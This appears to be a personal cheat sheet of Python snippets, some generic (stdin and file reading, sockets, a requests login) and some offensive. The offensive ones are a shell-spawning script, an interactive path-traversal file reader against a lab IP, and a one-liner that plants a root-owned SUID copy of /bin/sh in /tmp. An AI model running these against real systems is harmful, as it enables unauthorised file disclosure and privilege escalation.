# Python

```python
## asroot.py
import os
os.system('/bin/bash')

```
```python
## read from sys.stdin

import sys

for line in sys.stdin:
    line = line.rstrip()
    if 'exit' == line.rstrip():
        break
    print(f'Processing Message from sys.stdin *****{line}*****')
print("Done")

```


```python
# requests : post, get cookie
import requests
import string

session = requests.Session()
url = "http://888.darknet.com/"

response = session.get(url)

cookies = session.cookies.get_dict()
files = {'upload': open('file.txt','rb')}
data = {"username":"admin", "password":"xxxxxxxx", "action":"Login"}
headers = {'user-agent': 'my-app/0.0.1'}

r = session.post(url, files=files, data=data, cookies=cookies,  headers=headers)
url_main  = r.url
r = requests.get(url_main, cookies=cookies)
print (r.text)

# cookies = session.cookies.get_dict()
# print (cookies)


```

```python

#!/usr/bin/python3
import requests as req
import re

host='http://192.168.90.104/nomercy/windows/code.php?file=../../../../../../../../..'

while True:
    command=input("file: ")
    combined=host+command
    resp = req.get(combined)
    content = resp.text
    stripped = re.sub('<[^<]+?>', '', content)
    clean = re.sub('<?', '', stripped)
    print(clean)

```

```python
# client
#!/usr/bin/python

from socket import *
from time import *

host = "127.0.0.1"
port = int(1234)

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))

print s.recv(256)

s.close() # close socket. be nice.


```


```python
# server
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

s.bind(("0.0.0.0", 4444))
s.listen(10)

cSock, addr = s.accept()
handler(cSock, addr)

```


```python
# read file
import sys

thisdict = {}

f = open("words.txt", "r")
lines = f.readlines()
for line in lines:
        line = line.strip()
        line_sorted = "".join(sorted(line))
        # print("{} : {} : {}".format(count, line, line_sorted))
        thisdict[line_sorted] = line

```
```python
# read file
with open('passwd.txt',encoding='utf-8', mode='r') as f:
    raw_words = f.read()

for w in raw_words.split():
    w = w.strip()

```



```python
# set suid
import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh'); os.system('chmod 4755 /tmp/sh');

```
